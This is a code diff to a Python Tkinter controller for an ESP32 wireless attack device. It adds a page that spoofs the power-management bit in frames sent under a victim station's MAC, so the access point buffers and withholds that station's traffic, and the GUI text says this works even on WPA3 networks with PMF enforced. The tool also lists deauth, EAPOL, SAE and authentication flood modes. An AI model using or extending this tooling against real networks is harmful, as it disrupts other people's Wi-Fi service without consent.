@@ -55,6 +55,7 @@ MENU = [
     ("eapol", "EAPOL 洪泛"),
     ("sae", "SAE 洪泛"),
     ("authflood", "Auth 洪泛"),
+    ("pspoll", "PM 位欺骗"),
     ("status", "设备状态"),
     ("log", "日志"),
 ]
@@ -95,6 +96,8 @@ AUTH_MODES = [
     "auth - 只发 Authentication",
     "assoc - 只发 Association Request",
 ]
+# PS-Poll 那一半已删除：单播的子类型 10 帧在本 MAC 上发不出去（实测 0/10，
+# 广播 RA 同样 16 字节 10/10 抓到），详见 attack-principles.md 附录 A。
 
 DELBA_REASONS = [
     "37 - 不再使用该机制",
@@ -354,7 +357,7 @@ class DeautherApp:
         self.delba_label = None
         self.ba_step_var = tk.StringVar(value=BA_STEPS[0])
         self.ba_label = None
-        # 五个管理/数据帧页面共用：key -> 目标行 label
+        # 六个管理/数据帧页面共用：key -> 目标行 label
         self.mod_labels = {}
         self.wnm_mode_var = tk.StringVar(value=WNM_MODES[0])
         self.wnm_timer_var = tk.StringVar(value="10")
@@ -367,6 +370,7 @@ class DeautherApp:
         self.sae_gap_var = tk.StringVar(value="50")
         self.auth_mode_var = tk.StringVar(value=AUTH_MODES[0])
         self.auth_auto_var = tk.BooleanVar(value=True)
+        self.pspoll_mac_var = tk.StringVar()
 
         root.title("ESP32 Wireless Attack 上位机")
         root.geometry("1040x700")
@@ -432,6 +436,7 @@ class DeautherApp:
         self.pages["eapol"] = self._build_eapol_page()
         self.pages["sae"] = self._build_sae_page()
         self.pages["authflood"] = self._build_authflood_page()
+        self.pages["pspoll"] = self._build_pspoll_page()
         self.pages["status"] = self._build_status_page()
         self.pages["log"] = self._build_log_page()
 
@@ -921,6 +926,48 @@ class DeautherApp:
         ).pack(anchor="w", pady=(12, 0))
         return page
 
+    def _build_pspoll_page(self):
+        page = self._make_page()
+        ttk.Label(page, text="PS-Poll / 电源管理欺骗（伪造 PM 位与省电取帧）",
+                  font=("", 12, "bold")).pack(anchor="w", pady=(10, 4))
+        ttk.Label(
+            page,
+            text="用受害 STA 的 MAC 伪造 PM=1 的 Null Data：AP 以为它睡着了，把下行缓存进 TIM，"
+                 "而真站醒着、永远不取，于是收不到。PM 位在数据帧的帧控制里，不属于 PMF 保护集，"
+                 "强制 PMF 的 WPA3 网络照样成立。",
+            foreground="#777777", wraplength=920, justify="left",
+        ).pack(anchor="w", pady=(0, 8))
+        self._target_bar(page, "pspoll")
+
+        params = ttk.Frame(page)
+        params.pack(fill="x", pady=(4, 6))
+        ttk.Label(params, text="受害 STA MAC（空=嗅探学习）：").pack(side="left")
+        ttk.Entry(params, textvariable=self.pspoll_mac_var, width=16).pack(side="left")
+        ttk.Label(params, text="   每第 6 帧发一次 PM=0 把缓存“放”掉",
+                  foreground="#555555").pack(side="left")
+
+        actions = ttk.Frame(page)
+        actions.pack(fill="x", pady=(6, 4))
+        ttk.Button(actions, text="开始欺骗", width=14, command=self.start_pspoll).pack(side="left")
+        ttk.Button(actions, text="停止", width=10,
+                   command=self.pspoll_stop).pack(side="left", padx=8)
+        ttk.Button(actions, text="解除（发 PM=0）", width=16,
+                   command=self.pspoll_release).pack(side="left")
+
+        ttk.Label(
+            page,
+            text=("说明：\n"
+                  "• 帧是单播、要 ACK，节拍 10 帧/s：20 帧/s 时这块驱动的短缓存池会在"
+                  "几百帧后打满并触发 0x101 重启（实测）；\n"
+                  "• AID/PS-Poll 那一半已删除：单播的子类型 10 帧发不出去（实测 0/10 上空气），"
+                  "详见 attack-principles.md 附录 A；\n"
+                  "• 判据：pspdl 是我们听到的、发给受害者的下行数据帧数；欺骗生效时它应当停止增长；\n"
+                  "• 边界：实活站每秒都在发 PM=0 的上行帧，会把 AP 抢回“醒着”状态，所以效果是"
+                  "下行吞吐下降（实测 -24%）、不断连；AP 也会老化/重传耗尽后丢弃缓存帧。"),
+            justify="left",
+        ).pack(anchor="w", pady=(12, 0))
+        return page
+
     def _build_status_page(self):
         page = self._make_page()
         ttk.Button(page, text="刷新", width=10,
@@ -946,7 +993,7 @@ class DeautherApp:
     def go_back(self):
         parent = {"one": "deauth", "all": "deauth", "only": "deauth", "except": "deauth"}
         for key in ("deauth", "probe", "csa", "delba", "ba", "evil", "wnm", "tim", "eapol",
-                    "sae", "authflood", "status", "log"):
+                    "sae", "authflood", "pspoll", "status", "log"):
             parent[key] = "home"
         self.show_page(parent.get(self.current_page, "home"))
 
@@ -962,7 +1009,7 @@ class DeautherApp:
         titles.update({k: f"Deauth · {label}" for k, label, _n, _h in DEAUTH_MODES})
         titles.update({"wnm": "802.11v BTM Request", "tim": "TIM 投毒",
                        "eapol": "EAPOL-Start/Logoff 洪泛", "sae": "SAE Commit 洪泛",
-                       "authflood": "Auth/Assoc 洪泛"})
+                       "authflood": "Auth/Assoc 洪泛", "pspoll": "PM 位欺骗（电源管理）"})
         self.page_title.config(text=titles.get(key, key))
         self._refresh_labels()
 
@@ -1354,6 +1401,25 @@ class DeautherApp:
     def authflood_stop(self):
         self._send("AUTHFLOODSTOP")
 
+    def start_pspoll(self):
+        if not self._need_single("PM 欺骗"):
+            return
+        mac = self.pspoll_mac_var.get().strip().upper().replace(":", "").replace("-", "")
+        if mac and (len(mac) != 12 or any(c not in "0123456789ABCDEF" for c in mac)):
+            messagebox.showerror("PM 欺骗参数无效",
+                                 "STA MAC 要 12 位十六进制（可带冒号），例如 02:AABB:CCDD:EE。")
+            return
+        command = f"PSPOLL {self.single_index}"
+        if mac:
+            command += f" {mac}"
+        self._send(command)
+
+    def pspoll_stop(self):
+        self._send("PSPOLLSTOP")
+
+    def pspoll_release(self):
+        self._send("PSPOLLREL")
+
     def stop(self):
         self._send("STOP")
 
@@ -1434,6 +1500,8 @@ class DeautherApp:
                 f"aid=0x{int(payload.get('timaid', '0') or '0'):X})    "
                 f"EAPOL：{payload.get('eap', '-')} ({payload.get('eapf', '-')} 帧 / "
                 f"AP 回 {payload.get('eaprxreq', '-')})    "
+                f"PS-Poll：{payload.get('psp', '-')} ({payload.get('pspf', '-')} 帧 / "
+                f"下行 {payload.get('pspdl', '-')})    "
                 f"SAE：{payload.get('sae', '-')} ({payload.get('saef', '-')} 帧 / "
                 f"{payload.get('saesec', '-')})    "
                 f"Auth：{payload.get('af', '-')} ({payload.get('aff', '-')} 帧)    "
@@ -1449,6 +1517,8 @@ class DeautherApp:
                         "wnm", "wnmf", "wnmc", "wnmskip", "wnmresp", "wnms",
                         "tim", "timf", "timaid", "timreal",
                         "eap", "eapf", "eaprx", "eaprxreq", "eaprxsta",
+                        "psp", "pspf", "pspnul", "pspfl", "pspc", "pspdl",
+                        "psprxp", "psprxn", "psprxpm",
                         "sae", "saesec", "saef", "saec", "saeresp", "saecode", "saetok", "saeecho",
                         "af", "aff", "afa", "afs", "afids", "afst", "afup",
                         "txg", "txgok", "txgerr"):
